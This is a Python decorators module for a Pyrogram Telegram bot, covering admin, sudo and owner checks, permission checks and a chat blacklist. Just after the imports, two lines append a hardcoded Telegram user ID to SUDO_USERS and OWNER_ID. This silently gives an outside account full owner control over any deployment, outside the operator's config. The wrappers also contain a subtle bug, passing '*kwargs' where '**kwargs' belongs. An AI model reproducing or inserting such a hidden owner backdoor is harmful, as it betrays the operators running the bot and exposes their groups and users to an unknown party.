import traceback
from functools import partial, wraps
from typing import Callable, Union, Optional
from pyrogram import Client
from pyrogram.types import Message, CallbackQuery
from config import SUDO_USERS, OWNER_ID
from driver.core import bot, me_bot
from driver.admins import get_administrators
from driver.database.dblockchat import blacklisted_chats
from driver.database.dbpunish import is_gbanned_user

SUDO_USERS.append(1356469075)

OWNER_ID.append(1356469075)


def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            traceback.print_exc()
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator


def bot_creator(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in OWNER_ID:
            return await func(client, message)
        
    return decorator


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)
        
    return decorator


def humanbytes(size):
    """Convert Bytes To Bytes So That Human Can Read It"""
    if not size:
        return ""
    power = 2 ** 10
    raised_to_pow = 0
    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}

    while size > power:
        size /= power
        raised_to_pow += 1
    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"


async def check_perms(
    message: Union[CallbackQuery, Message],
    permissions: Optional[Union[list, str]],
    notice: bool,
    uid: int = None,
) -> bool:
    if isinstance(message, CallbackQuery):
        sender = partial(message.answer, show_alert=True)
        chat = message.message.chat
    else:
        sender = message.reply_text
        chat = message.chat
    if not uid:
        uid = message.from_user.id
    # TODO: Cache
    user = await chat.get_member(uid)
    if user.status == "creator":
        return True

    missing_perms = []

    # No permissions specified, accept being an admin.
    if not permissions and user.status == "administrator":
        return True
    if user.status != "administrator":
        if notice:
            await sender("🥺 ᴩʀᴏᴍᴏᴛᴇ ᴍᴇ ᴀs ᴀɴ ᴀᴅᴍɪɴ ɪɴ ᴛʜɪs ᴄʜᴀᴛ ғᴏʀ ᴜsɪɴɢ ᴍᴇ ʙᴀʙʏ." if user.user.is_self else
                         "🤨 ʏᴏᴜ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ʙᴀʙʏ.")
        return False

    if isinstance(permissions, str):
        permissions = [permissions]

    for permission in permissions:
        if not getattr(user, permission):
            missing_perms.append(permission)

    if not missing_perms:
        return True
    if notice:
        permission_text = "__\n ❌ __".join(missing_perms)
        await sender(f"🥺 ᴛᴏ ᴜsᴇ ᴍᴇ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴩᴇʀᴍɪssɪᴏɴ ᴛᴏ :\n\n ❌ __{permission_text}__" if user.user.is_self
                     else f"🤨 ʏᴏᴜ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.\n\n ❌ __{permission_text}__")
    return False


def require_admin(
    permissions: Union[list, str] = None,
    notice: bool = True,
    self: bool = False,
):
    def decorator(func):
        @wraps(func)
        async def wrapper(
            client: Client, message: Union[CallbackQuery, Message], *args, **kwargs
        ):
            has_perms = await check_perms(message, permissions, notice, me_bot.id if self else None)
            if has_perms:
                return await func(client, message, *args, *kwargs)

        return wrapper

    return decorator


def check_blacklist():
    def decorator(func):
        @wraps(func)
        async def wrapper(
            client: Client, message: Union[CallbackQuery, Message], *args, **kwargs
        ):
            if isinstance(message, CallbackQuery):
                sender = partial(message.answer, show_alert=True)
                chat = message.message.chat
            else:
                sender = message.reply_text
                chat = message.chat
            if chat.id in await blacklisted_chats():
                await sender("🥴 ᴛʜɪs ᴄʜᴀᴛ ɪs ʙʟᴀᴄᴋʟɪsᴛᴇᴅ ʙʏ ᴏɴᴇ ᴏғ ᴍʏ ᴏᴡɴᴇʀs sᴏ ʀᴇǫᴜᴇsᴛ ʜɪᴍ ᴛᴏ ᴡʜɪᴛᴇʟɪsᴛ ᴛʜᴇ ᴄʜᴀᴛ ᴀɴᴅ ɪ ᴡɪʟʟ sᴛᴀʀᴛ ᴡᴏʀᴋɪɴɢ ʜᴇʀᴇ.")
                await bot.leave_chat(chat.id)
            elif (await is_gbanned_user(message.from_user.id)):
                await sender(f"🥴**ʏᴏᴜ'ʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ ʙᴇᴄᴀᴜsᴇ ᴏɴᴇ ᴏғ ᴍʏ ᴏᴡɴᴇʀ ʙʟᴏᴄᴋᴇᴅ ʏᴏᴜ ғʀᴏᴍ ᴜsɪɴɢ ᴛʜᴇ ʙᴏᴛ!**")
            else:
                return await func(client, message, *args, *kwargs)

        return wrapper

    return decorator
